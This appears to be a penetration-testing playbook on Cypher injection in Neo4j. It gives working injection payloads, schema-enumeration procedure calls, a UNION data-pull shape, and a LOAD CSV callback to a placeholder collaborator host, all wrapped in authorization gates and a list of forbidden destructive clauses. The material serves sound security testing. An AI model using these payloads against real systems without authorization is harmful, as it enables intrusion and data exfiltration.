# Cypher injection (Neo4j) and the graph-database family

## Why this lives here and not in hunt-nosqli

`hunt-nosqli` is about **operator objects**: a JSON value where the application
expected a string, so `{"$ne": null}` or `{"$regex": ".*"}` arrives as structured
data and the driver evaluates it. Nothing is parsed as text; the attack is a type
confusion in the document model.

Cypher injection is the opposite shape. Cypher is a **string-parsed query
language**, like SQL. The application concatenates untrusted text into a query,
the parser reads the attacker's clause as query structure, and the same quote
breaking, clause termination and comment tricks apply that work against SQL. The
reason it is missed is that practitioners file "Neo4j" under NoSQL and reach for
`$ne` payloads, which do nothing against a text parser.

Practical rule: if the sink is a JSON body whose values become operators, read
`hunt-nosqli`. If the sink is a query string assembled with `+` or an f-string,
it belongs here, whatever the database is called.

**Cadence.** Serial, 1.5s base plus up to 1.5s jitter. Caps per parameter: 20
Stage A requests, 10 timing trials. Stage B is sign-off gated.

---

## Where concatenation is forced

Neo4j parameters are written `$name` and are the safe path. The Cypher manual is
explicit that parameters work for literals and expressions, node and relationship
ids, and dynamically referenced properties, labels and relationship types, but
that they **cannot** be used for three constructs:

- Property keys: `MATCH (n) WHERE n.$param = 'something'` is invalid.
- Relationship types: `MATCH (n)-[:$param]->(m)` is invalid.
- Node labels: `MATCH (n:$param)` is invalid.

Those three are exactly where a developer who parameterised everything else
still concatenates. An application that lets the client choose a label, a
relationship type or a sort property is the high-probability sink, in the same
way that `ORDER BY` is the high-probability sink in SQL.

---

## Attack surface signals

- A search or graph-explorer endpoint taking `label`, `type`, `relationship`,
  `nodeLabel`, `sortBy` or `orderBy` as a free string.
- Response bodies containing `Neo.ClientError.Statement.SyntaxError`,
  `Neo.ClientError.Security.Forbidden`, or the string `Neo4j` in an error.
- HTTP transaction endpoints under `/db/<name>/tx` or `/db/data/transaction`, or
  a Bolt port (7687) and the browser UI (7474/7473) reachable from outside.
- Any product built on a graph backend that exposes "related items", "path
  between", "recommendations" or an org-chart traversal.

---

## Stage A — confirm injection and read the version

Read-only. Stop as soon as you have a differential plus a version string: that
is already a critical finding and everything below it is Stage B.

```cypher
// Break out of a string literal, the same way as SQL. Look for a syntax error
// differential against a benign value.
'  "  `  }  )

// Boolean differential inside a WHERE that was built by concatenation.
' OR 1=1 OR ''='
' AND 1=0 OR ''='

// Comment out the tail of the query. Cypher's line comment is //.
' //
```

Version and identity, via built-in procedures. `dbms.components()` and
`dbms.showCurrentUser()` are not admin-only, so they commonly answer for the
application's own role:

```cypher
CALL dbms.components() YIELD name, versions, edition
CALL dbms.showCurrentUser()
```

A `UNION`-style data pull has one constraint worth knowing before you waste
requests: the Cypher manual states "The number and the names of the columns must
be identical in all queries combined by using `UNION`." Aliasing with `AS` to
match the original query's returned column names is therefore mandatory, and it
replaces SQL's column-count enumeration as the first thing to establish.

```cypher
// Shape only. Match the column names the endpoint already returns.
' RETURN 1 AS <col> UNION MATCH (n) RETURN labels(n)[0] AS <col> //
```

Schema discovery, read-only and not admin-only:

```cypher
CALL db.labels()
CALL db.propertyKeys()
CALL db.schema.visualization()
```

`CALL dbms.listConfig()` returns the server configuration, including paths and
credentials-adjacent settings, but it is marked **Admin Only** and needs either
`EXECUTE ADMIN PROCEDURES` or both `EXECUTE PROCEDURES` and
`EXECUTE BOOSTED PROCEDURES`. A successful call is itself an authorization
finding: the application's role is a graph administrator.

---

## Stage B — outbound requests from the database

**Gate: explicit written sign-off. This reaches hosts other than the injection
target, so it is the same separate authorization question as `dblink` in
`postgresql-escalation.md`. Cross-reference `hunt-ssrf`.**

`LOAD CSV` is the primitive. Its documented syntax is:

```
LOAD CSV [WITH HEADERS] FROM <value expression> AS <binding variable> [FIELDTERMINATOR <character string literal>]
```

The manual states that "LOAD CSV supports accessing CSV files via HTTPS, HTTP,
and FTP (with or without credentials)" and that it follows redirects except
protocol-changing ones. Access to `file:///` URLs is separately controlled by
`dbms.security.allow_csv_import_from_file_urls`, with the import root set by
`server.directories.import`. Loading requires load privileges, which the manual
recommends restricting to trusted sources.

One request, to a host you own, carrying a unique canary in the path so the
listener can attribute it:

```cypher
// Stage B. ONE attempt. Your listener, your host.
' LOAD CSV FROM 'http://<CANARY>.<YOUR-COLLABORATOR-DOMAIN>/c' AS r RETURN 0 AS <col> //
```

Proof is the inbound DNS plus HTTP hit carrying the exact canary, with the
database server's source IP. No callback means no outbound reachability, which
is also a reportable result. Do not iterate this across internal addresses: that
is a port scan of third-party hosts and it is out of scope.

If an APOC procedure library is installed, procedures in the `apoc.load.*` family
provide the same outbound primitive for JSON and JDBC targets. APOC is an add-on
and its contents vary by version, so enumerate before assuming any specific
procedure name exists. The documented listing command needs no special privilege
in its base form:

```cypher
SHOW PROCEDURES EXECUTABLE BY CURRENT USER YIELD name WHERE name STARTS WITH 'apoc'
```

Do not guess a procedure name into a payload. A name that does not exist returns
a syntax or `ProcedureNotFound` error that looks exactly like "not vulnerable".

---

## Never send these

- `CREATE`, `MERGE`, `SET`, `REMOVE`, `DELETE` or `DETACH DELETE` in any form.
  A graph write is a data modification, and in a graph database a careless
  `DETACH DELETE` removes relationships as well as nodes.
- `CALL dbms.security.createUser` or any procedure in the user or role
  administration family.
- `apoc.periodic.*` or anything that schedules repeated work on the server.
- A timing oracle built on a large `LOAD CSV`. It is a resource-exhaustion
  payload against a database that usually holds the whole graph in memory.

---

## Root causes

1. A label, relationship type or property key is client-selectable, and the
   driver offers no way to parameterise those three constructs, so the developer
   concatenated.
2. The "we use a graph database, SQL injection does not apply" assumption, which
   is the same reasoning error as the NoSQL version in `hunt-nosqli` but with the
   opposite remedy.
3. A single application role with administrator privileges, because the project
   started as a single-tenant internal tool.
4. APOC installed wholesale for one procedure, leaving the outbound-request and
   JDBC families reachable.

---

## Sources

- Neo4j Cypher manual:
  [parameters](https://neo4j.com/docs/cypher-manual/current/syntax/parameters/),
  [`UNION`](https://neo4j.com/docs/cypher-manual/current/clauses/union/),
  [`LOAD CSV`](https://neo4j.com/docs/cypher-manual/current/clauses/load-csv/).
- Neo4j Cypher manual:
  [`SHOW PROCEDURES`](https://neo4j.com/docs/cypher-manual/current/clauses/listing-procedures/).
- Neo4j operations manual:
  [built-in procedures](https://neo4j.com/docs/operations-manual/current/reference/procedures/)
  for which procedures are admin-only.
- Varonis, [Neo4jection: Secrets, Data, and Cloud Exploits](https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits).
- Coverage of the technique list was checked against the HackTricks
  `pentesting-web/sql-injection/cypher-injection-neo4j` page
  (<https://github.com/HackTricks-wiki/hacktricks>, CC BY-NC 4.0), used as a
  checklist only. All prose, staging and safety guidance here is written against
  the Neo4j documentation linked above.
